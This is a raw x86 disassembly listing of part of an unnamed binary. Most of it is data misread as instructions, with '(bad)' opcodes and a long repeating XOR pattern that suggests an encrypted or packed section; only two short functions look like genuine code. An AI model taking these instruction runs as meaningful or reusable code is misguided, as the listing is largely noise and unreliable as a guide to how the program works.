  422ce2:	sub    edx,DWORD PTR [edi+ecx*4+0x7b86a079]
  422ce9:	mov    ds:0xdda46768,al
  422cee:	fmul   DWORD PTR [edi-0x5c]
  422cf1:	dec    ecx
  422cf2:	(bad)  
  422cf3:	adc    al,0xf7
  422cf5:	mov    ds:0x5970839c,al
  422cfa:	int3   
  422cfb:	call   0x77f:0xa876aae1
  422d02:	cmp    BYTE PTR ds:[bx+si],dh
  422d06:	pop    edx
  422d07:	xchg   esi,eax
  422d08:	in     al,dx
  422d09:	or     DWORD PTR [ebp-0x33],edi
  422d0c:	stos   BYTE PTR es:[edi],al
  422d0d:	popa   
  422d0e:	repz mov ds:0xf128600e,eax
  422d14:	sbb    ebp,DWORD PTR [ecx+0x75]
  422d17:	int3   
  422d18:	ins    BYTE PTR es:[edi],dx
  422d19:	imul   eax,DWORD PTR [ebx+0x56d1182f],0x2f01a2b4
  422d23:	sub    DWORD PTR [edi-0x7f25c409],edi
  422d29:	add    DWORD PTR [ebx+0x6fa08eb1],edx
  422d2f:	int3   
  422d30:	loopne 0x422d6d
  422d32:	enter  0xded3,0xc6
  422d36:	push   cs
  422d37:	mov    ch,0xf8
  422d39:	push   esi
  422d3a:	jl     0x422ce8
  422d3c:	aaa    
  422d3d:	into   
  422d3e:	repnz retf 0x9e0e
  422d42:	bound  edx,QWORD PTR ds:[ebx]
  422d45:	add    BYTE PTR [edi-0x41],bh
  422d48:	pop    edi
  422d49:	adc    ch,BYTE PTR [esi+eax*1]
  422d4c:	lds    edi,FWORD PTR [ecx]
  422d4e:	jno    0x422d6c
  422d50:	stc    
  422d51:	into   
  422d52:	jp     0x422d89
  422d54:	rcr    BYTE PTR [ebp+0x43c19a78],1
  422d5a:	bnd jno 0x422ddb
  422d5d:	pushf  
  422d5e:	dec    esi
  422d5f:	mov    ah,0x62
  422d61:	ja     0x422d58
  422d63:	(bad)  
  422d64:	dec    BYTE PTR [ecx]
  422d66:	(bad)  
  422d67:	sub    al,BYTE PTR [esi+0x37]
  422d6a:	sbb    eax,0x4e60c78f
  422d6f:	cdq    
  422d70:	pop    ds
  422d71:	je     0x422d8e
  422d73:	sar    cl,cl
  422d75:	outs   dx,BYTE PTR ds:[esi]
  422d76:	dec    esp
  422d77:	dec    eax
  422d78:	call   0xf020:0xd505995f
  422d7f:	imul   ecx,DWORD PTR [ebp+0x17126145],0xfffffff4
  422d86:	mov    ch,0xf8
  422d88:	sub    DWORD PTR [edi+edx*8+0x7b33fc46],edi
  422d8f:	daa    
  422d90:	mov    dh,0x77
  422d92:	inc    DWORD PTR [edx]
  422d94:	xchg   esp,eax
  422d95:	scas   al,BYTE PTR es:[edi]
  422d96:	aad    0x80
  422d98:	lea    ecx,[ecx+edi*4]
  422d9b:	out    0x2b,al
  422d9d:	pop    edi
  422d9e:	fbstp  TBYTE PTR [edx-0x16913ba9]
  422da4:	pop    ebx
  422da5:	adc    BYTE PTR ds:[esp+esi*1+0xc67ab12],bl
  422dad:	shl    BYTE PTR [edx+ebp*4],cl
  422db0:	fld    DWORD PTR [edx+esi*4+0x5c]
  422db4:	fld    DWORD PTR [eax]
  422db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422db8:	push   ebx
  422db9:	mov    al,0x8d
  422dbb:	xor    eax,0x6cb63d40
  422dc0:	out    dx,eax
  422dc1:	mov    ebx,0xb618a8f
  422dc6:	cwde   
  422dc7:	scas   al,BYTE PTR es:[edi]
  422dc8:	(bad)  
  422dc9:	js     0x422dae
  422dcb:	fld    QWORD PTR [edx+edx*2+0x49bcdbd]
  422dd2:	dec    esi
  422dd3:	mov    bl,0xfe
  422dd5:	call   0x76d684e6
  422dda:	and    eax,0x2d98456c
  422ddf:	loop   0x422d8a
  422de1:	in     al,0xaa
  422de3:	mov    edi,eax
  422de5:	push   esp
  422de6:	xchg   esp,eax
  422de7:	mov    al,0x9
  422de9:	int3   
  422dea:	popa   
  422deb:	cs xchg edx,eax
  422ded:	fnsetpm(287 only) 
  422def:	cld    
  422df0:	jnp    0x422d7a
  422df2:	ins    BYTE PTR es:[edi],dx
  422df3:	sar    esp,1
  422df5:	dec    edx
  422df6:	mov    ds:0x9cb67e34,al
  422dfb:	ja     0x422df0
  422dfd:	and    dl,BYTE PTR [edx-0x2a]
  422e00:	sub    bl,cl
  422e02:	repnz or ebx,DWORD PTR [ebx+0x5ed44afc]
  422e09:	out    dx,eax
  422e0a:	mov    ds:0xd3da9434,al
  422e0f:	inc    edx
  422e10:	jnp    0x422e22
  422e12:	xchg   esi,eax
  422e13:	push   edx
  422e14:	sbb    al,0xcf
  422e16:	xlat   BYTE PTR ds:[ebx]
  422e17:	push   ebp
  422e18:	rcl    DWORD PTR [ebx-0x4e],0x4f
  422e1c:	mov    edx,DWORD PTR [ebx-0x45]
  422e1f:	call   DWORD PTR [edx+0x2]
  422e22:	fisttp DWORD PTR [edx-0x3b541d0a]
  422e28:	add    BYTE PTR [esi-0x19],dh
  422e2b:	mov    cl,0x8b
  422e2d:	xor    bl,BYTE PTR [edi]
  422e2f:	xchg   edx,eax
  422e30:	xlat   BYTE PTR ds:[ebx]
  422e31:	scas   al,BYTE PTR es:[edi]
  422e32:	fiadd  WORD PTR [edi+0x2cbc85ab]
  422e38:	pop    esp
  422e39:	outs   dx,BYTE PTR ds:[esi]
  422e3a:	loop   0x422dfd
  422e3c:	mov    BYTE PTR [edi],cl
  422e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e3f:	pop    ss
  422e40:	lods   al,BYTE PTR ds:[esi]
  422e41:	mov    ss,WORD PTR [ecx+0x50298edf]
  422e47:	cmp    al,0xdf
  422e49:	jp     0x422e37
  422e4b:	ret    
  422e4c:	les    ebx,FWORD PTR [ecx]
  422e4e:	jmp    DWORD PTR [edx]
  422e50:	lock cwde 
  422e52:	pusha  
  422e53:	adc    al,0x92
  422e55:	xor    edx,DWORD PTR [ebp+0x5da22714]
  422e5b:	sub    al,0x80
  422e5d:	and    DWORD PTR [eax+edi*1],edx
  422e60:	dec    ebp
  422e61:	xor    bl,bh
  422e63:	sub    BYTE PTR [ecx],bl
  422e65:	mov    edi,0xe4f16e33
  422e6a:	xor    BYTE PTR [ecx-0x36],ah
  422e6d:	ret    
  422e6e:	xor    ch,0xbd
  422e71:	adc    bl,BYTE PTR [edi+0x2434072d]
  422e77:	jl     0x422eb8
  422e79:	(bad)  
  422e7a:	repz les edi,FWORD PTR [eax+0x78]
  422e7e:	mov    dl,0xba
  422e80:	push   ebp
  422e81:	test   BYTE PTR [esi+0x59fbc81b],0xca
  422e88:	retf   0xcb01
  422e8b:	or     al,0xcd
  422e8d:	inc    edi
  422e8e:	ficom  WORD PTR [ecx-0x29cf0fe6]
  422e94:	imul   esp,DWORD PTR [ebx],0x52212413
  422e9a:	xchg   edx,eax
  422e9b:	(bad)  
  422e9c:	xor    bh,BYTE PTR [ebx+edx*1-0x20]
  422ea0:	push   ecx
  422ea1:	cli    
  422ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ea3:	inc    ebp
  422ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ea5:	sub    eax,0xa5c036e3
  422eaa:	shl    DWORD PTR [ebx],0x35
  422ead:	sti    
  422eae:	pop    es
  422eaf:	mov    DWORD PTR [edi+0x3017a611],0xd7b9a63c
  422eb9:	gs add al,bh
  422ebc:	mov    esp,edi
  422ebe:	in     eax,dx
  422ebf:	pushf  
  422ec0:	push   es
  422ec1:	aas    
  422ec2:	jge    0x422e75
  422ec4:	jl     0x422ec8
  422ec6:	sbb    ebp,DWORD PTR [eax]
  422ec8:	jmp    0x422f18
  422eca:	cld    
  422ecb:	mov    edi,0x621f34d1
  422ed0:	mov    ebp,0x5edb6306
  422ed5:	or     esp,DWORD PTR [edx]
  422ed7:	loop   0x422e5d
  422ed9:	jo     0x422eb6
  422edb:	sub    al,al
  422edd:	xor    BYTE PTR [ecx+0x792560a0],cl
  422ee3:	sub    eax,0x6dce7671
  422ee8:	aad    0x6e
  422eea:	pop    edi
  422eeb:	dec    eax
  422eec:	shl    DWORD PTR ds:0xca7531d1,cl
  422ef2:	(bad)
  422ef5:	push   esi
  422ef6:	and    bl,BYTE PTR [eax-0x429a4b0e]
  422efc:	(bad)  
  422efd:	fisttp DWORD PTR [ebp+eax*8-0x2f645a93]
  422f04:	lock push es
  422f06:	ins    BYTE PTR es:[edi],dx
  422f07:	ins    DWORD PTR es:[edi],dx
  422f08:	cmp    BYTE PTR [edx],bh
  422f0a:	or     al,0x38
  422f0c:	dec    esp
  422f0d:	adc    ch,BYTE PTR [edi+0x47412db]
  422f13:	sbb    DWORD PTR [esp+ebp*1+0x58618c18],ebp
  422f1a:	sbb    al,0x6
  422f1c:	jecxz  0x422f1f
  422f1e:	lods   al,BYTE PTR ds:[esi]
  422f1f:	mov    dh,0x25
  422f21:	enter  0xcef9,0x9
  422f25:	jmp    0x422f6a
  422f27:	pop    esi
  422f28:	add    DWORD PTR [eax+0x1],edi
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x2923dedf
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	jmp    DWORD PTR [eax+0x7e]
  422fd5:	clc    
  422fd6:	inc    eax
  422fd7:	xor    BYTE PTR [esi-0x4e],al
  422fda:	mov    esi,0xa97446e9
  422fdf:	repnz shl BYTE PTR [eax+ebp*2],cl
  422fe3:	clc    
  422fe4:	xor    eax,DWORD PTR [esi-0x4e]
  422fe7:	mov    esi,0xe97446ed
  422fec:	or     eax,0x4068242d
  422ff1:	xor    eax,DWORD PTR [esi-0x4e]
  422ff4:	mov    esi,0xa97446ed
  422ff9:	or     eax,0x4068242d
  422ffe:	xor    eax,DWORD PTR [esi-0x4e]
  423001:	mov    esi,0xa97446ed
  423006:	or     eax,0x4068242d
  42300b:	xor    eax,DWORD PTR [esi-0x4e]
  42300e:	mov    esi,0xa9744615
  423013:	add    esi,DWORD PTR [edx]
  423015:	sahf   
  423016:	inc    ax
  423018:	xchg   DWORD PTR [edi+0x7f],ecx
  42301b:	lahf   
  42301c:	push   ebp
  42301d:	inc    edi
  42301e:	cmp    BYTE PTR [esp+ebp*1+0x79],ah
  423022:	dec    esp
  423023:	add    DWORD PTR [ebx],esi
  423025:	adc    esi,DWORD PTR [esi]
  423027:	rcl    cl,0x8a
  42302a:	xor    al,0x15
  42302c:	les    ebp,FWORD PTR ds:0x2e06454e
  423032:	pop    esp
  423033:	xor    dl,BYTE PTR [edx+0x66688dc]
  423039:	fsub   QWORD PTR [ebx+0xd]
  42303c:	dec    ebp
  42303d:	push   es
  42303e:	pusha  
  42303f:	ja     0x42304a
  423041:	loope  0x422fe1
  423043:	sub    BYTE PTR [ecx],0x10
  423046:	int3   
  423047:	and    esp,DWORD PTR [eax]
  423049:	sub    DWORD PTR [edx+0x64],esp
  42304c:	xor    eax,DWORD PTR [esi-0x4e]
  42304f:	mov    esi,0xae7446ed
  423054:	xchg   esp,eax
  423055:	sar    DWORD PTR [ebp+0x2b],1
  423058:	mov    eax,0x46f14ca1
  42305d:	jg     0x4230ab
  42305f:	aaa    
  423060:	push   ecx
  423061:	lahf   
  423062:	daa    
  423063:	jl     0x423072
  423065:	dec    esp
  423066:	cmp    DWORD PTR [ecx],ebx
  423068:	dec    edx
  423069:	sub    al,0xe7
  42306b:	push   ds
  42306c:	adc    DWORD PTR [ecx-0x52310f9],edx
  423072:	dec    edx
  423073:	imul   esp,DWORD PTR [ebx],0xffffff8b
  423076:	mov    ah,0x85
  423078:	mov    esi,0xa321a3e6
  42307d:	sbb    eax,0xd4cb0662
  423082:	mov    eax,0x7e576df4
  423087:	jecxz  0x42307e
  423089:	mov    edi,0x32c0222e
  42308e:	dec    esp
  42308f:	jmp    0x9e51:0x374c7f46
  423096:	daa    
  423097:	or     al,0x91
  423099:	sar    BYTE PTR [ecx],cl
  42309b:	stc    
  42309c:	push   0x3e
  42309e:	out    0xb,eax
  4230a0:	mov    WORD PTR [ebx],?
  4230a2:	pop    es
  4230a3:	jne    0x4230e6
  4230a5:	push   ebp
  4230a6:	dec    edx
  4230a7:	cmp    edi,DWORD PTR [esi+0x23b5b420]
  4230ad:	jl     0x423052
  4230af:	dec    edi
  4230b0:	aad    0xb6
  4230b2:	bound  ebx,QWORD PTR [eax]
  4230b4:	push   esi
  4230b5:	dec    ecx
  4230b6:	mov    eax,0x7ed415fc
  4230bb:	sti    
  4230bc:	fs dec esi
  4230be:	dec    esp
  4230bf:	sub    edi,DWORD PTR [eax-0x414db35f]
  4230c5:	in     eax,dx
  4230c6:	inc    esi
  4230c7:	je     0x423072
  4230c9:	or     eax,0x402d742d
  4230ce:	xor    ecx,DWORD PTR [edx]
  4230d0:	mov    bl,0xbc
  4230d2:	in     eax,dx
  4230d3:	stos   BYTE PTR es:[edi],al
  4230d4:	xchg   edi,eax
  4230d5:	test   BYTE PTR [edx+0x2d],0x24
  4230d9:	push   0xb2463340
  4230de:	mov    esi,0xa877460d
  4230e3:	push   es
  4230e4:	sub    al,0x2e
  4230e6:	push   0xb242df40
  4230eb:	mov    esi,0xa97440e9
  4230f0:	or     eax,0xfd69242d
  4230f5:	xor    eax,DWORD PTR [esi-0x4e]
  4230f8:	scas   al,BYTE PTR es:[edi]
  4230f9:	in     eax,dx
  4230fa:	inc    esi
  4230fb:	je     0x4230a6
  4230fd:	or     BYTE PTR ds:0x33016824,ch
  423103:	inc    esi
  423104:	mov    ds:0x7646edbe,al
  423109:	test   eax,0x6924280d
  42310e:	inc    eax
  42310f:	xor    eax,DWORD PTR [esi-0x4e]
  423112:	mov    esi,0xa97546e8
  423117:	or     eax,0x4068242d
  42311c:	mov    bl,0x4d
  42311e:	mov    dl,0xbe
  423120:	jmp    0x3c56a56b
  423125:	sub    BYTE PTR [edx+ebp*2],ah
  423128:	inc    eax
  423129:	xor    eax,esi
  42312b:	mov    dl,0xbe
  42312d:	std    
  42312e:	inc    esi
  42312f:	je     0x4230ea
  423131:	or     eax,0x5068242d
  423136:	xor    eax,DWORD PTR [esi-0x5e]
  423139:	mov    esi,0xa97446ed
  42313e:	or     eax,0x4068243d
  423143:	xor    eax,DWORD PTR [esi-0x4e]
  423146:	mov    esi,0xa97446ed
  42314b:	mov    DWORD PTR [ebx+0x2f],eax
  42314e:	push   0xb2463029
  423153:	mov    esi,0x66744ddd
  423158:	xor    BYTE PTR ds:0x33406824,ch
  42315e:	inc    esi
  42315f:	mov    dl,0xbe
  423161:	in     eax,dx
  423162:	inc    esi
  423163:	je     0x42310e
  423165:	or     eax,0x4068242d
  42316a:	xor    eax,DWORD PTR [esi-0x4e]
  42316d:	mov    esi,0xa97446ed
  423172:	or     eax,0x4068242d
  423177:	xor    eax,DWORD PTR [esi-0x4e]
  42317a:	mov    esi,0xa97446ed
  42317f:	or     eax,0x4068242d
  423184:	xor    eax,DWORD PTR [esi-0x4e]
  423187:	mov    esi,0xa97446ed
  42318c:	or     eax,0x4068242d
  423191:	xor    eax,DWORD PTR [esi-0x4e]
  423194:	mov    esi,0xa97446ed
  423199:	or     eax,0x4068242d
  42319e:	xor    eax,DWORD PTR [esi-0x4e]
  4231a1:	mov    esi,0xa97446ed
  4231a6:	or     eax,0x4068242d
  4231ab:	xor    eax,DWORD PTR [esi-0x4e]
  4231ae:	mov    esi,0xa97446ed
  4231b3:	or     eax,0x4068242d
  4231b8:	xor    eax,DWORD PTR [esi-0x4e]
  4231bb:	mov    esi,0xa97446ed
  4231c0:	or     eax,0x3446242d
  4231c5:	push   esi
  4231c6:	ds (bad) 
  4231c8:	mov    esi,0x897446ed
  4231cd:	push   es
  4231ce:	sub    eax,0x33407824
  4231d3:	inc    esi
  4231d4:	mov    BYTE PTR [edx-0x568fb913],bh
  4231da:	or     eax,0x722b617d
  4231df:	or     DWORD PTR [bp+si-0x1242],esi
  4231e4:	inc    esi
  4231e5:	je     0x423190
  4231e7:	sub    eax,0x6e88242d
  4231ec:	inc    ecx
  4231ed:	xor    eax,0x46edddc0
  4231f2:	je     0x42319d
  4231f4:	pop    ebp
  4231f5:	sub    eax,0x38706824
  4231fa:	inc    esi
  4231fb:	mov    dl,0xee
  4231fd:	in     eax,dx
  4231fe:	inc    esi
  4231ff:	je     0x423198
  423201:	or     DWORD PTR ds:0x33406824,ebp
  423207:	inc    esi
  423208:	mov    dl,0xbe
  42320a:	in     eax,dx
  42320b:	inc    esi
  42320c:	je     0x4231b7
  42320e:	or     eax,0xa068240d
  423213:	xor    eax,DWORD PTR [esi-0x4e]
  423216:	mov    esi,0xa97446ed
  42321b:	or     eax,0x4068242d
  423220:	xor    eax,DWORD PTR [esi-0x4e]
  423223:	mov    esi,0xa97446ed
  423228:	or     eax,0x4068242d
  42322d:	xor    eax,DWORD PTR [esi-0x4e]
  423230:	mov    esi,0xa97446ed
  423235:	or     eax,0x4068242d
  42323a:	xor    eax,DWORD PTR [esi-0x4e]
  42323d:	mov    esi,0xa97446ed
  423242:	or     eax,0x4068242d
  423247:	xor    eax,DWORD PTR [esi-0x4e]
  42324a:	mov    esi,0xa97446ed
  42324f:	or     eax,0x4068242d
  423254:	xor    eax,DWORD PTR [esi-0x4e]
  423257:	mov    esi,0xa97446ed
  42325c:	or     eax,0x4068242d
  423261:	xor    eax,DWORD PTR [esi-0x4e]
  423264:	mov    esi,0xa97446ed
  423269:	or     eax,0x4068242d
  42326e:	xor    eax,DWORD PTR [esi-0x4e]
  423271:	mov    esi,0xa97446ed
  423276:	or     eax,0x4068242d
  42327b:	xor    eax,DWORD PTR [esi-0x4e]
  42327e:	mov    esi,0xa97446ed
  423283:	or     eax,0x4068242d
  423288:	xor    eax,DWORD PTR [esi-0x4e]
  42328b:	mov    esi,0xa97446ed
  423290:	or     eax,0x4068242d
  423295:	xor    eax,DWORD PTR [esi-0x4e]
  423298:	mov    esi,0xa97446ed
  42329d:	or     eax,0x4068242d
  4232a2:	xor    eax,DWORD PTR [esi-0x4e]
  4232a5:	mov    esi,0xa97446ed
  4232aa:	or     eax,0x4068242d
  4232af:	xor    eax,DWORD PTR [esi-0x4e]
  4232b2:	mov    esi,0xa97446ed
  4232b7:	or     eax,0x4068242d
  4232bc:	xor    eax,DWORD PTR [esi-0x4e]
  4232bf:	mov    esi,0xa97446ed
  4232c4:	or     eax,0x4068242d
  4232c9:	xor    eax,DWORD PTR [esi-0x4e]
  4232cc:	mov    esi,0xa97446ed
  4232d1:	or     eax,0x4068242d
  4232d6:	xor    eax,DWORD PTR [esi-0x4e]
  4232d9:	mov    esi,0xa97446ed
  4232de:	or     eax,0x4068242d
  4232e3:	xor    eax,DWORD PTR [esi-0x4e]
  4232e6:	mov    esi,0xa97446ed
  4232eb:	or     eax,0x4068242d
  4232f0:	xor    eax,DWORD PTR [esi-0x4e]
  4232f3:	mov    esi,0xa97446ed
  4232f8:	or     eax,0x4068242d
  4232fd:	xor    eax,DWORD PTR [esi-0x4e]
  423300:	mov    esi,0xa97446ed
  423305:	or     eax,0x4068242d
  42330a:	xor    eax,DWORD PTR [esi-0x4e]
  42330d:	mov    esi,0xa97446ed
  423312:	or     eax,0x4068242d
  423317:	xor    eax,DWORD PTR [esi-0x4e]
  42331a:	mov    esi,0xa97446ed
  42331f:	or     eax,0x4068242d
  423324:	xor    eax,DWORD PTR [esi-0x4e]
  423327:	mov    esi,0xa97446ed
  42332c:	or     eax,0x4068242d
  423331:	xor    eax,DWORD PTR [esi-0x4e]
  423334:	mov    esi,0xa97446ed
  423339:	or     eax,0x4068242d
  42333e:	xor    eax,DWORD PTR [esi-0x4e]
  423341:	mov    esi,0xa97446ed
  423346:	or     eax,0x4068242d
  42334b:	xor    eax,DWORD PTR [esi-0x4e]
  42334e:	mov    esi,0xa97446ed
  423353:	or     eax,0x4068242d
  423358:	xor    eax,DWORD PTR [esi-0x4e]
  42335b:	mov    esi,0xa97446ed
  423360:	or     eax,0x4068242d
  423365:	xor    eax,DWORD PTR [esi-0x4e]
  423368:	mov    esi,0xa97446ed
  42336d:	or     eax,0x4068242d
  423372:	xor    eax,DWORD PTR [esi-0x4e]
  423375:	mov    esi,0xa97446ed
  42337a:	or     eax,0x4068242d
  42337f:	xor    eax,DWORD PTR [esi-0x4e]
  423382:	mov    esi,0xa97446ed
  423387:	or     eax,0x4068242d
  42338c:	xor    eax,DWORD PTR [esi-0x4e]
  42338f:	mov    esi,0xa97446ed
  423394:	or     eax,0x4068242d
  423399:	xor    eax,DWORD PTR [esi-0x4e]
  42339c:	mov    esi,0xa97446ed
  4233a1:	or     eax,0x4068242d
  4233a6:	xor    eax,DWORD PTR [esi-0x4e]
  4233a9:	mov    esi,0xa97446ed
  4233ae:	or     eax,0x4068242d
  4233b3:	xor    eax,DWORD PTR [esi-0x4e]
  4233b6:	mov    esi,0xa97446ed
  4233bb:	or     eax,0x4068242d
  4233c0:	xor    eax,DWORD PTR [esi-0x4e]
  4233c3:	mov    esi,0xa97446ed
  4233c8:	or     eax,0x4068242d
  4233cd:	xor    eax,DWORD PTR [esi-0x4e]
  4233d0:	mov    esi,0x473346ed
  4233d5:	pop    es
  4233d6:	sub    eax,0x2340680b
  4233db:	inc    esi
  4233dc:	mov    dl,0x94
  4233de:	dec    edi
  4233df:	pushf  
  4233e0:	add    eax,0xba00f2cf
  4233e5:	out    dx,eax
  4233e6:	adc    dh,bl
  4233e8:	jo     0x423444
  4233ea:	lods   eax,DWORD PTR ds:[esi]
  4233eb:	pop    ecx
  4233ec:	rcl    DWORD PTR [edx],cl
  4233ee:	fmul   DWORD PTR [ecx-0x826c889]
  4233f4:	and    eax,0x6c34562b
  4233f9:	sbb    BYTE PTR [edx-0x35],0x9d
  4233fd:	adc    bl,BYTE PTR ds:0x51820f5b
  423403:	nop
  423404:	mov    esi,0xfcfce1ca
  423409:	pop    esp
  42340a:	inc    eax
  42340b:	lea    ebx,[edx+0x7d]
  42340e:	out    dx,al
  42340f:	push   edx
  423410:	add    ebx,esi
  423412:	std    
  423413:	sbb    eax,0x44e2b852
  423418:	test   DWORD PTR [edi+eiz*4],eax
  42341b:	mov    DWORD PTR [edx+0x75],ebp
  42341e:	xor    edi,DWORD PTR [ecx-0x3f26bd48]
  423424:	mov    ah,0x26
  423426:	enter  0x3789,0xd1
  42342a:	retf   
  42342b:	xor    ecx,0xa3186933
  423431:	cli    
  423432:	mov    edi,0x4a7907b0
  423437:	sti    
  423438:	mov    bl,0x81
  42343a:	cld    
  42343b:	(bad)  
  42343c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42343d:	inc    ebp
  42343e:	rol    edx,cl
  423440:	lahf   
  423441:	jge    0x42347c
  423443:	and    esp,esp
  423445:	or     BYTE PTR [esi],ch
  423447:	fdiv   DWORD PTR [ecx+ecx*8-0x73989925]
  42344e:	mov    ds:0x3df996da,al
  423453:	xor    eax,0xe6add46d
  423458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423459:	mov    edx,0x34e4a22c
  42345e:	xchg   ecx,eax
  42345f:	mov    ecx,0x88a495c0
  423464:	push   0x11566c77
  423469:	mov    al,0x8a
  42346b:	icebp  
  42346c:	push   0x6
  42346e:	inc    esp
  42346f:	pushf  
  423470:	jae    0x423439
  423472:	out    dx,eax
  423473:	je     0x4234ba
  423475:	data16 jge 0x423468
  423478:	mov    ebx,eax
  42347a:	or     DWORD PTR [ebp-0x4ca2d335],eax
  423480:	inc    edi
  423481:	pop    edx
  423482:	imul   eax,DWORD PTR [edx+0x14435db1],0xffffffa1
  423489:	xchg   DWORD PTR [edi],esp
  42348b:	(bad)  
  42348c:	ja     0x4234da
  42348e:	inc    ebp
  42348f:	sub    dh,BYTE PTR [edi]
  423491:	mov    esp,0xde6bf93c
  423496:	dec    esi
  423497:	aaa    
  423498:	sti    
  423499:	and    al,0xa2
  42349b:	ror    DWORD PTR [ecx-0x1a],0x88
  42349f:	adc    DWORD PTR [ecx],ebx
  4234a1:	cmp    eax,0x2f0c6a92
  4234a6:	idiv   esp
  4234a8:	mov    bl,0x7c
  4234aa:	pop    es
  4234ab:	je     0x42350b
  4234ad:	fstp   QWORD PTR [ebp+0x29]
  4234b0:	gs dec ebx
  4234b2:	adc    BYTE PTR [esi+0x70],dl
  4234b5:	mov    esp,0x226ba212
  4234ba:	xchg   DWORD PTR [edi-0x219d0f2f],edi
  4234c0:	mov    edi,edi
  4234c2:	das    
  4234c3:	imul   ebp,DWORD PTR [eax-0x2b],0x76
  4234c7:	or     al,0x1f
  4234c9:	out    dx,al
  4234ca:	(bad)  
  4234cb:	jb     0x42347e
  4234cd:	cs jg  0x4234db
  4234d0:	adc    ecx,DWORD PTR [eax+0x72f03340]
  4234d6:	fist   WORD PTR [edi]
  4234d8:	mov    bh,0x70
  4234da:	cs stos DWORD PTR es:[edi],eax
  4234dc:	inc    ebx
  4234dd:	jmp    0x4234db
  4234df:	add    ebp,DWORD PTR [eax-0x74]
  4234e2:	mov    eax,DWORD PTR [eax]
  4234e4:	cmp    ecx,DWORD PTR [esi]
  4234e6:	es mov edx,0xe4c19e22
  4234ec:	fcomp  DWORD PTR [eax+0x5e6a7c2f]
  4234f2:	stc    
  4234f3:	dec    eax
  4234f4:	push   ss
  4234f5:	mov    edx,0xa8a05787
  4234fa:	mov    eax,ds:0x88442d03
  4234ff:	pop    edi
  423500:	nop
  423501:	dec    ecx
  423502:	test   DWORD PTR [edx+0xb5f57b1],0x26031453
  42350c:	push   ecx
  42350d:	xor    al,0xc8
  42350f:	cs xchg edi,eax
  423511:	ins    BYTE PTR es:[edi],dx
  423512:	inc    ebp
  423513:	jbe    0x4234dc
  423515:	push   esp
  423516:	or     al,0x1f
  423518:	sbb    DWORD PTR [edi-0x32],0x122823fb
  42351f:	call   0x617a:0xe1b0422e
  423526:	in     al,dx
  423527:	mov    al,ds:0x96fde0c2
  42352c:	js     0x4234e3
  42352e:	dec    edi
  42352f:	ror    BYTE PTR [ebx-0x49],0xca
  423533:	pop    esi
  423534:	and    al,0x9f
  423536:	in     eax,0xc
  423538:	(bad)  
  423539:	fsubrp st(5),st
  42353b:	inc    ebx
  42353c:	mov    BYTE PTR [eax],cl
  42353e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42353f:	int3   
  423540:	sti    
  423541:	test   DWORD PTR [edx-0x69],eax
  423544:	rep lods al,BYTE PTR ds:[esi]
  423546:	cmp    ah,dh
  423548:	in     eax,dx
  423549:	mov    bl,0x71
  42354b:	push   ebp
  42354c:	test   DWORD PTR [edx+edx*4],edi
  42354f:	xchg   esi,eax
  423550:	ret    0x8199
  423553:	adc    edi,DWORD PTR [eax]
  423555:	xchg   BYTE PTR [ecx-0x5cb7234d],ah
  42355b:	outs   dx,BYTE PTR ds:[esi]
  42355c:	add    ebp,eax
  42355e:	ret    0x570a
  423561:	jnp    0x423524
  423563:	mov    eax,ds:0xe4aed410
  423568:	xlat   BYTE PTR ds:[ebx]
  423569:	push   ebx
  42356a:	or     eax,0xf9a712ac
  42356f:	imul   ebx,ecx,0x6a
  423572:	pop    DWORD PTR [edi+ecx*8-0x74c62b46]
  423579:	or     DWORD PTR [esi+0x45c2fad1],0xb74ef170
  423583:	cmp    BYTE PTR [ebx+0x11ea2e7b],dl
  423589:	aaa    
  42358a:	push   ss
  42358b:	and    bh,BYTE PTR ds:0xd80d8513
  423591:	sti    
  423592:	(bad)  
  423593:	sub    bl,BYTE PTR [ecx]
  423595:	hlt    
  423596:	inc    esp
  423597:	push   ecx
  423598:	sbb    al,0x9f
  42359a:	push   esi
  42359b:	pop    ss
  42359c:	jge    0x423529
  42359e:	rcr    bl,1
  4235a0:	out    0xfd,eax
  4235a2:	call   0xce08a83d
  4235a7:	push   0xf9a5174d
